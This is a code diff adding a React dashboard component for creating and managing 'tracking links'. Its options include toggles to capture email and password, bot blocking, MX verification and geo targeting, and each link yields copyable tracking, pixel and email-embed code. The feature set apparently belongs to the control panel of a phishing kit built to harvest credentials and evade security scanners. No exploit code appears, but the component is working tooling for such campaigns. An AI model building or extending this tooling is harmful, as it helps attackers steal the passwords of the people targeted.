@@ -1,0 +1,693 @@
+import React, { useState, useEffect } from 'react';
+
+const TrackingLinks = () => {
+  const [links, setLinks] = useState([]);
+  const [searchTerm, setSearchTerm] = useState('');
+  const [filter, setFilter] = useState('All');
+  const [showCreateModal, setShowCreateModal] = useState(false);
+  const [hiddenUrls, setHiddenUrls] = useState({});
+  const [loading, setLoading] = useState(true);
+  const [analytics, setAnalytics] = useState({
+    totalClicks: 0,
+    realVisitors: 0,
+    botsBlocked: 0
+  });
+  const [newLink, setNewLink] = useState({
+    target_url: '',
+    preview_url: '',
+    campaign_name: '',
+    capture_email: false,
+    capture_password: false,
+    bot_blocking_enabled: true,
+    rate_limiting_enabled: false,
+    dynamic_signature_enabled: false,
+    mx_verification_enabled: false,
+    geo_targeting_enabled: false,
+    geo_targeting_mode: 'allow', // 'allow' or 'block'
+    allowed_countries: [],
+    blocked_countries: [],
+    allowed_cities: [],
+    blocked_cities: [],
+    allowed_regions: [],
+    blocked_regions: []
+  });
+
+  useEffect(() => {
+    fetchLinks();
+    fetchAnalytics();
+  }, []);
+
+  const fetchAnalytics = async () => {
+    try {
+      const response = await fetch('/api/analytics/summary', {
+        headers: {
+          'Authorization': `Bearer ${localStorage.getItem('token')}`
+        }
+      });
+      
+      if (response.ok) {
+        const data = await response.json();
+        setAnalytics(data);
+      } else {
+        // Fallback to client-side calculation if API fails
+        const totalClicks = links.reduce((sum, link) => sum + (link.total_clicks || 0), 0);
+        const realVisitors = links.reduce((sum, link) => sum + (link.real_visitors || 0), 0);
+        const botsBlocked = links.reduce((sum, link) => sum + (link.blocked_attempts || 0), 0);
+        setAnalytics({ totalClicks, realVisitors, botsBlocked });
+      }
+    } catch (error) {
+      console.error('Error fetching analytics:', error);
+      // Fallback to client-side calculation on network error
+      const totalClicks = links.reduce((sum, link) => sum + (link.total_clicks || 0), 0);
+      const realVisitors = links.reduce((sum, link) => sum + (link.real_visitors || 0), 0);
+      const botsBlocked = links.reduce((sum, link) => sum + (link.blocked_attempts || 0), 0);
+      setAnalytics({ totalClicks, realVisitors, botsBlocked });
+    }
+  };
+
+  const fetchLinks = async () => {
+    setLoading(true);
+    try {
+      const response = await fetch('/api/links', {
+        headers: {
+          'Authorization': `Bearer ${localStorage.getItem('token')}`
+        }
+      });
+      
+      if (response.ok) {
+        const data = await response.json();
+        setLinks(data.links || []);
+        // Update analytics based on fetched links
+        const totalClicks = (data.links || []).reduce((sum, link) => sum + (link.total_clicks || 0), 0);
+        const realVisitors = (data.links || []).reduce((sum, link) => sum + (link.real_visitors || 0), 0);
+        const botsBlocked = (data.links || []).reduce((sum, link) => sum + (link.blocked_attempts || 0), 0);
+        setAnalytics({ totalClicks, realVisitors, botsBlocked });
+      } else {
+        // Handle API error, maybe show a message to the user
+        console.error('Failed to fetch links:', response.statusText);
+      }
+    } catch (error) {
+      console.error('Error fetching links:', error);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const copyToClipboard = async (text, type) => {
+    try {
+      await navigator.clipboard.writeText(text);
+      const notification = document.createElement('div');
+      notification.className = 'fixed top-4 right-4 bg-green-500 text-white px-4 py-2 rounded-lg shadow-lg z-50 text-sm font-medium';
+      notification.textContent = `${type} copied to clipboard!`;
+      document.body.appendChild(notification);
+      setTimeout(() => {
+        document.body.removeChild(notification);
+      }, 2000);
+    } catch (err) {
+      console.error('Failed to copy:', err);
+    }
+  };
+
+  const toggleUrlVisibility = (linkId) => {
+    setHiddenUrls(prev => ({
+      ...prev,
+      [linkId]: !prev[linkId]
+    }));
+  };
+
+  const regenerateLink = async (linkId) => {
+    try {
+      const response = await fetch(`/api/links/${linkId}/regenerate`, {
+        method: 'POST',
+        headers: {
+          'Authorization': `Bearer ${localStorage.getItem('token')}`
+        }
+      });
+      
+      if (response.ok) {
+        fetchLinks();
+        const notification = document.createElement('div');
+        notification.className = 'fixed top-4 right-4 bg-blue-500 text-white px-4 py-2 rounded-lg shadow-lg z-50 text-sm font-medium';
+        notification.textContent = 'Link regenerated successfully!';
+        document.body.appendChild(notification);
+        setTimeout(() => {
+          document.body.removeChild(notification);
+        }, 2000);
+      } else {
+        console.error('Failed to regenerate link:', response.statusText);
+      }
+    } catch (error) {
+      console.error('Error regenerating link:', error);
+    }
+  };
+
+  const deleteLink = async (linkId) => {
+    if (confirm('Are you sure you want to delete this link?')) {
+      try {
+        const response = await fetch(`/api/links/${linkId}`, {
+          method: 'DELETE',
+          headers: {
+            'Authorization': `Bearer ${localStorage.getItem('token')}`
+          }
+        });
+        
+        if (response.ok) {
+          fetchLinks();
+        } else {
+          console.error('Failed to delete link:', response.statusText);
+          setLinks(prev => prev.filter(link => link.id !== linkId)); // Client-side removal on error
+        }
+      } catch (error) {
+        console.error('Error deleting link:', error);
+        setLinks(prev => prev.filter(link => link.id !== linkId)); // Client-side removal on network error
+      }
+    }
+  };
+
+  const testLink = (link) => {
+    const testUrl = link.tracking_url.replace('{id}', 'test-' + Date.now());
+    window.open(testUrl, '_blank');
+  };
+
+  const createLink = async () => {
+    if (!newLink.target_url || !newLink.campaign_name) {
+      alert('Please fill in all required fields');
+      return;
+    }
+
+    try {
+      const response = await fetch('/api/links', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${localStorage.getItem('token')}`
+        },
+        body: JSON.stringify(newLink)
+      });
+      
+      if (response.ok) {
+        fetchLinks();
+        setShowCreateModal(false);
+        setNewLink({
+          target_url: '',
+          preview_url: '',
+          campaign_name: '',
+          capture_email: false,
+          capture_password: false,
+          bot_blocking_enabled: true,
+          rate_limiting_enabled: false,
+          dynamic_signature_enabled: false,
+          mx_verification_enabled: false,
+          geo_targeting_enabled: false,
+          geo_targeting_mode: 'allow',
+          allowed_countries: [],
+          blocked_countries: [],
+          allowed_cities: [],
+          blocked_cities: [],
+          allowed_regions: [],
+          blocked_regions: []
+        });
+      } else {
+        console.error('Failed to create link:', response.statusText);
+      }
+    } catch (error) {
+      console.error('Error creating link:', error);
+    }
+  };
+
+  const filteredLinks = links.filter(link => {
+    const matchesSearch = (link.campaign_name && link.campaign_name.toLowerCase().includes(searchTerm.toLowerCase())) ||
+                         (link.target_url && link.target_url.toLowerCase().includes(searchTerm.toLowerCase())) ||
+                         (link.tracking_url && link.tracking_url.toLowerCase().includes(searchTerm.toLowerCase()));
+    const matchesFilter = filter === 'All' || (link.status && link.status.toLowerCase() === filter.toLowerCase());
+    return matchesSearch && matchesFilter;
+  });
+
+  if (loading) {
+    return (
+      <div className="p-6 bg-slate-900 min-h-screen text-white">
+        <div className="animate-pulse">
+          <div className="h-8 bg-slate-700 rounded w-1/4 mb-6"></div>
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+            {[1, 2, 3].map(i => (
+              <div key={i} className="h-24 bg-slate-700 rounded"></div>
+            ))}
+          </div>
+          <div className="space-y-4">
+            {[1, 2, 3].map(i => (
+              <div key={i} className="h-32 bg-slate-700 rounded"></div>
+            ))}
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  return (
+    <div className="p-4 md:p-6 space-y-6 bg-slate-900 min-h-screen text-white">
+      {/* Header */}
+      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 gap-4">
+        <div>
+          <h1 className="text-xl md:text-2xl font-bold">Tracking Links</h1>
+          <p className="text-slate-400 mt-1 text-sm md:text-base">Create and manage your tracking links</p>
+        </div>
+        <div className="flex flex-col sm:flex-row gap-2 w-full sm:w-auto">
+          <button 
+            onClick={() => setShowCreateModal(true)}
+            className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-sm md:text-base"
+          >
+            Create Link
+          </button>
+        </div>
+      </div>
+
+      {/* Analytics Overview */}
+      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 md:gap-6 mb-6">
+        <div className="bg-slate-800 rounded-lg shadow-sm p-4 border border-slate-700">
+          <div className="flex items-center justify-between">
+            <div>
+              <p className="text-sm font-medium text-slate-400">Total Clicks</p>
+              <p className="text-2xl font-bold text-blue-400">{analytics.totalClicks.toLocaleString()}</p>
+            </div>
+            <div className="p-3 bg-blue-500/20 rounded-full">
+              <span className="text-blue-400 text-lg">👆</span>
+            </div>
+          </div>
+        </div>
+
+        <div className="bg-slate-800 rounded-lg shadow-sm p-4 border border-slate-700">
+          <div className="flex items-center justify-between">
+            <div>
+              <p className="text-sm font-medium text-slate-400">Real Visitors</p>
+              <p className="text-2xl font-bold text-green-400">{analytics.realVisitors.toLocaleString()}</p>
+            </div>
+            <div className="p-3 bg-green-500/20 rounded-full">
+              <span className="text-green-400 text-lg">👥</span>
+            </div>
+          </div>
+        </div>
+
+        <div className="bg-slate-800 rounded-lg shadow-sm p-4 border border-slate-700">
+          <div className="flex items-center justify-between">
+            <div>
+              <p className="text-sm font-medium text-slate-400">Bots Blocked</p>
+              <p className="text-2xl font-bold text-red-400">{analytics.botsBlocked.toLocaleString()}</p>
+            </div>
+            <div className="p-3 bg-red-500/20 rounded-full">
+              <span className="text-red-400 text-lg">🤖</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      {/* Search and Filters */}
+      <div className="bg-slate-800 rounded-lg shadow-sm p-4 mb-6 border border-slate-700">
+        <div className="flex flex-col sm:flex-row gap-4">
+          <div className="flex-1 relative">
+            <span className="absolute left-3 top-3 text-slate-400">🔍</span>
+            <input
+              type="text"
+              placeholder="Search links..."
+              value={searchTerm}
+              onChange={(e) => setSearchTerm(e.target.value)}
+              className="w-full pl-10 pr-4 py-2.5 bg-slate-700 border border-slate-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-sm text-white"
+            />
+          </div>
+          <div className="flex gap-2">
+            {['All', 'Active', 'Paused', 'Expired'].map(filterOption => (
+              <button
+                key={filterOption}
+                onClick={() => setFilter(filterOption)}
+                className={`px-3 py-2 rounded-lg text-sm font-medium transition-colors ${
+                  filter === filterOption
+                    ? 'bg-orange-500 text-white'
+                    : 'bg-slate-700 text-slate-300 hover:bg-slate-600'
+                }`}
+              >
+                {filterOption}
+              </button>
+            ))}
+          </div>
+        </div>
+      </div>
+
+      {/* Links Section */}
+      <div className="bg-slate-800 rounded-lg shadow-sm border border-slate-700 overflow-hidden">
+        <div className="p-4 border-b border-slate-700">
+          <h2 className="text-lg font-semibold">Your Tracking Links</h2>
+          <p className="text-sm text-slate-400 mt-1">Manage and monitor your tracking links</p>
+        </div>
+
+        <div className="divide-y divide-slate-700">
+          {filteredLinks.length === 0 && !loading ? (
+            <div className="p-4 text-center text-slate-400">
+              No links found. Create a new one to get started!
+            </div>
+          ) : (
+            filteredLinks.map(link => (
+              <div key={link.id} className="p-4 hover:bg-slate-700 transition-colors">
+                {/* Link Header */}
+                <div className="flex justify-between items-start mb-3">
+                  <div className="flex items-center gap-3">
+                    <h3 className="font-medium text-white text-sm">{link.campaign_name || 'Untitled Campaign'}</h3>
+                    <span className={`px-2 py-1 rounded-full text-xs font-medium ${
+                      link.status === 'active' 
+                        ? 'bg-green-500/20 text-green-400' 
+                        : 'bg-slate-500/20 text-slate-400'
+                    }`}>
+                      {link.status}
+                    </span>
+                  </div>
+                  <div className="flex items-center gap-1">
+                    <button
+                      onClick={() => toggleUrlVisibility(link.id)}
+                      className="p-2 text-slate-400 hover:text-white transition-colors rounded-lg hover:bg-slate-700"
+                      title={hiddenUrls[link.id] ? 'Show URLs' : 'Hide URLs'}
+                    >
+                      {hiddenUrls[link.id] ? '👁️' : '🙈'}
+                    </button>
+                    <button
+                      onClick={() => regenerateLink(link.id)}
+                      className="p-2 text-slate-400 hover:text-blue-400 transition-colors rounded-lg hover:bg-slate-700"
+                      title="Regenerate Link"
+                    >
+                      🔄
+                    </button>
+                    <button
+                      onClick={() => deleteLink(link.id)}
+                      className="p-2 text-slate-400 hover:text-red-400 transition-colors rounded-lg hover:bg-slate-700"
+                      title="Delete Link"
+                    >
+                      🗑️
+                    </button>
+                  </div>
+                </div>
+
+                {/* Target URL */}
+                <div className="mb-3">
+                  <span className="text-xs text-slate-400">Target: </span>
+                  <a href={link.target_url} target="_blank" rel="noopener noreferrer" className="text-xs text-blue-400 hover:underline cursor-pointer font-medium">
+                    {link.target_url}
+                  </a>
+                </div>
+
+                {/* Stats */}
+                <div className="flex items-center gap-4 mb-4">
+                  <div className="flex items-center gap-1">
+                    <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
+                    <span className="text-xs text-slate-400 font-medium">{link.total_clicks || 0} clicks</span>
+                  </div>
+                  <div className="flex items-center gap-1">
+                    <div className="w-2 h-2 bg-green-500 rounded-full"></div>
+                    <span className="text-xs text-slate-400 font-medium">{link.real_visitors || 0} visitors</span>
+                  </div>
+                  <div className="flex items-center gap-1">
+                    <div className="w-2 h-2 bg-red-500 rounded-full"></div>
+                    <span className="text-xs text-slate-400 font-medium">{link.blocked_attempts || 0} Bot protected</span>
+                  </div>
+                </div>
+
+                {/* URLs Section */}
+                {!hiddenUrls[link.id] && (
+                  <div className="space-y-2 mt-4">
+                    <div>
+                      <label className="block text-xs font-medium text-slate-400 mb-1">TRACKING URL</label>
+                      <div className="flex items-center gap-2">
+                        <input
+                          type="text"
+                          value={link.tracking_url || ''}
+                          readOnly
+                          className="flex-1 px-3 py-2 bg-slate-700 border border-slate-600 rounded-lg text-sm text-white font-mono"
+                        />
+                        <button
+                          onClick={() => copyToClipboard(link.tracking_url, 'Tracking URL')}
+                          className="p-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg transition-colors"
+                          title="Copy"
+                        >
+                          📋
+                        </button>
+                        <button
+                          onClick={() => testLink(link)}
+                          className="p-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg transition-colors"
+                          title="Test"
+                        >
+                          🧪
+                        </button>
+                      </div>
+                    </div>
+                    <div>
+                      <label className="block text-xs font-medium text-slate-400 mb-1">PIXEL URL</label>
+                      <div className="flex items-center gap-2">
+                        <input
+                          type="text"
+                          value={link.pixel_url || ''}
+                          readOnly
+                          className="flex-1 px-3 py-2 bg-slate-700 border border-slate-600 rounded-lg text-sm text-white font-mono"
+                        />
+                        <button
+                          onClick={() => copyToClipboard(link.pixel_url, 'Pixel URL')}
+                          className="p-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg transition-colors"
+                          title="Copy"
+                        >
+                          📋
+                        </button>
+                      </div>
+                    </div>
+                    <div>
+                      <label className="block text-xs font-medium text-slate-400 mb-1">EMAIL CODE</label>
+                      <div className="flex items-center gap-2">
+                        <textarea
+                          value={link.email_code || ''}
+                          readOnly
+                          rows="2"
+                          className="flex-1 px-3 py-2 bg-slate-700 border border-slate-600 rounded-lg text-sm text-white font-mono resize-none"
+                        ></textarea>
+                        <button
+                          onClick={() => copyToClipboard(link.email_code, 'Email Code')}
+                          className="p-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg transition-colors"
+                          title="Copy"
+                        >
+                          📋
+                        </button>
+                      </div>
+                    </div>
+                  </div>
+                )}
+              </div>
+            ))
+          )}
+        </div>
+      </div>
+      {/* Create Link Modal */}
+      {showCreateModal && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
+          <div className="bg-slate-800 rounded-lg w-full max-w-2xl max-h-[90vh] overflow-y-auto">
+            <div className="p-6 space-y-4">
+              <div className="flex items-center justify-between mb-4">
+                <h3 className="text-xl font-bold text-white">Create New Link</h3>
+                <button 
+                  onClick={() => setShowCreateModal(false)}
+                className="text-slate-400 hover:text-white"
+              >
+                ✕
+              </button>
+            </div>
+            
+            <div className="space-y-4">
+              <div>
+                <label className="block text-sm font-medium text-slate-300 mb-2">
+                  Target URL
+                </label>
+                <input
+                  type="url"
+                  placeholder="https://example.com"
+                  value={newLink.target_url}
+                  onChange={(e) => setNewLink({ ...newLink, target_url: e.target.value })}
+                  className="w-full px-3 py-2 bg-slate-700 border border-slate-600 text-white rounded-lg focus:border-blue-500 focus:outline-none"
+                />
+              </div>
+              
+              <div>
+                <label className="block text-sm font-medium text-slate-300 mb-2">
+                  Preview URL (Optional)
+                </label>
+                <input
+                  type="url"
+                  placeholder="https://preview.example.com"
+                  value={newLink.preview_url}
+                  onChange={(e) => setNewLink({ ...newLink, preview_url: e.target.value })}
+                  className="w-full px-3 py-2 bg-slate-700 border border-slate-600 text-white rounded-lg focus:border-blue-500 focus:outline-none"
+                />
+              </div>
+
+              <div>
+                <label className="block text-sm font-medium text-slate-300 mb-2">
+                  Campaign Name
+                </label>
+                <input
+                  type="text"
+                  placeholder="My New Campaign"
+                  value={newLink.campaign_name}
+                  onChange={(e) => setNewLink({ ...newLink, campaign_name: e.target.value })}
+                  className="w-full px-3 py-2 bg-slate-700 border border-slate-600 text-white rounded-lg focus:border-blue-500 focus:outline-none"
+                />
+              </div>
+
+              {/* Security Features */}
+              <div className="space-y-3 pt-4 border-t border-slate-700">
+                <h4 className="text-lg font-bold text-white">Security Features</h4>
+                <div className="flex items-center justify-between">
+                  <label htmlFor="bot_blocking" className="text-sm font-medium text-slate-300">Bot Blocking</label>
+                  <input
+                    type="checkbox"
+                    id="bot_blocking"
+                    checked={newLink.bot_blocking_enabled}
+                    onChange={(e) => setNewLink({ ...newLink, bot_blocking_enabled: e.target.checked })}
+                    className="h-4 w-4 text-blue-600 rounded focus:ring-blue-500"
+                  />
+                </div>
+                <div className="flex items-center justify-between">
+                  <label htmlFor="rate_limiting" className="text-sm font-medium text-slate-300">Rate Limiting</label>
+                  <input
+                    type="checkbox"
+                    id="rate_limiting"
+                    checked={newLink.rate_limiting_enabled}
+                    onChange={(e) => setNewLink({ ...newLink, rate_limiting_enabled: e.target.checked })}
+                    className="h-4 w-4 text-blue-600 rounded focus:ring-blue-500"
+                  />
+                </div>
+                <div className="flex items-center justify-between">
+                  <label htmlFor="dynamic_signature" className="text-sm font-medium text-slate-300">Dynamic Signature</label>
+                  <input
+                    type="checkbox"
+                    id="dynamic_signature"
+                    checked={newLink.dynamic_signature_enabled}
+                    onChange={(e) => setNewLink({ ...newLink, dynamic_signature_enabled: e.target.checked })}
+                    className="h-4 w-4 text-blue-600 rounded focus:ring-blue-500"
+                  />
+                </div>
+                <div className="flex items-center justify-between">
+                  <label htmlFor="mx_verification" className="text-sm font-medium text-slate-300">MX Verification</label>
+                  <input
+                    type="checkbox"
+                    id="mx_verification"
+                    checked={newLink.mx_verification_enabled}
+                    onChange={(e) => setNewLink({ ...newLink, mx_verification_enabled: e.target.checked })}
+                    className="h-4 w-4 text-blue-600 rounded focus:ring-blue-500"
+                  />
+                </div>
+
+                {/* Geo Targeting */}
+                <div className="flex items-center justify-between">
+                  <label htmlFor="geo_targeting" className="text-sm font-medium text-slate-300">Geo Targeting</label>
+                  <input
+                    type="checkbox"
+                    id="geo_targeting"
+                    checked={newLink.geo_targeting_enabled}
+                    onChange={(e) => setNewLink({ ...newLink, geo_targeting_enabled: e.target.checked })}
+                    className="h-4 w-4 text-blue-600 rounded focus:ring-blue-500"
+                  />
+                </div>
+                {newLink.geo_targeting_enabled && (
+                  <div className="space-y-3 pl-6">
+                    <div>
+                      <label className="block text-sm font-medium text-slate-300 mb-2">Mode</label>
+                      <select
+                        value={newLink.geo_targeting_mode}
+                        onChange={(e) => setNewLink({ ...newLink, geo_targeting_mode: e.target.value })}
+                        className="w-full px-3 py-2 bg-slate-700 border border-slate-600 text-white rounded-lg focus:border-blue-500 focus:outline-none"
+                      >
+                        <option value="allow">Allow (Whitelist)</option>
+                        <option value="block">Block (Blacklist)</option>
+                      </select>
+                    </div>
+                    <div>
+                      <label className="block text-sm font-medium text-slate-300 mb-2">Countries (comma-separated codes, e.g., US, GB)</label>
+                      <input
+                        type="text"
+                        value={newLink.geo_targeting_mode === 'allow' ? newLink.allowed_countries.join(', ') : newLink.blocked_countries.join(', ')}
+                        onChange={(e) => {
+                          const countries = e.target.value.split(',').map(c => c.trim().toUpperCase()).filter(c => c);
+                          setNewLink({ ...newLink, [newLink.geo_targeting_mode === 'allow' ? 'allowed_countries' : 'blocked_countries']: countries });
+                        }}
+                        className="w-full px-3 py-2 bg-slate-700 border border-slate-600 text-white rounded-lg focus:border-blue-500 focus:outline-none"
+                      />
+                    </div>
+                    <div>
+                      <label className="block text-sm font-medium text-slate-300 mb-2">Cities (comma-separated, e.g., New York, London)</label>
+                      <input
+                        type="text"
+                        value={newLink.geo_targeting_mode === 'allow' ? newLink.allowed_cities.join(', ') : newLink.blocked_cities.join(', ')}
+                        onChange={(e) => {
+                          const cities = e.target.value.split(',').map(c => c.trim()).filter(c => c);
+                          setNewLink({ ...newLink, [newLink.geo_targeting_mode === 'allow' ? 'allowed_cities' : 'blocked_cities']: cities });
+                        }}
+                        className="w-full px-3 py-2 bg-slate-700 border border-slate-600 text-white rounded-lg focus:border-blue-500 focus:outline-none"
+                      />
+                    </div>
+                    <div>
+                      <label className="block text-sm font-medium text-slate-300 mb-2">Regions (comma-separated, e.g., California, England)</label>
+                      <input
+                        type="text"
+                        value={newLink.geo_targeting_mode === 'allow' ? newLink.allowed_regions.join(', ') : newLink.blocked_regions.join(', ')}
+                        onChange={(e) => {
+                          const regions = e.target.value.split(',').map(c => c.trim()).filter(c => c);
+                          setNewLink({ ...newLink, [newLink.geo_targeting_mode === 'allow' ? 'allowed_regions' : 'blocked_regions']: regions });
+                        }}
+                        className="w-full px-3 py-2 bg-slate-700 border border-slate-600 text-white rounded-lg focus:border-blue-500 focus:outline-none"
+                      />
+                    </div>
+                  </div>
+                )}
+              </div>
+
+              {/* Capture Options */}
+              <div className="space-y-3 pt-4 border-t border-slate-700">
+                <h4 className="text-lg font-bold text-white">Capture Options</h4>
+                <div className="flex items-center justify-between">
+                  <label htmlFor="capture_email" className="text-sm font-medium text-slate-300">Capture Email</label>
+                  <input
+                    type="checkbox"
+                    id="capture_email"
+                    checked={newLink.capture_email}
+                    onChange={(e) => setNewLink({ ...newLink, capture_email: e.target.checked })}
+                    className="h-4 w-4 text-blue-600 rounded focus:ring-blue-500"
+                  />
+                </div>
+                <div className="flex items-center justify-between">
+                  <label htmlFor="capture_password" className="text-sm font-medium text-slate-300">Capture Password</label>
+                  <input
+                    type="checkbox"
+                    id="capture_password"
+                    checked={newLink.capture_password}
+                    onChange={(e) => setNewLink({ ...newLink, capture_password: e.target.checked })}
+                    className="h-4 w-4 text-blue-600 rounded focus:ring-blue-500"
+                  />
+                </div>
+              </div>
+              
+              <div className="flex gap-3 pt-4">
+                <button 
+                  onClick={() => setShowCreateModal(false)}
+                  className="flex-1 px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg"
+                >
+                  Cancel
+                </button>
+                <button 
+                  onClick={createLink}
+                  className="flex-1 px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg"
+                >
+                  Create Link
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+    </div>
+  );
+};
+
+export default TrackingLinks;
+
+
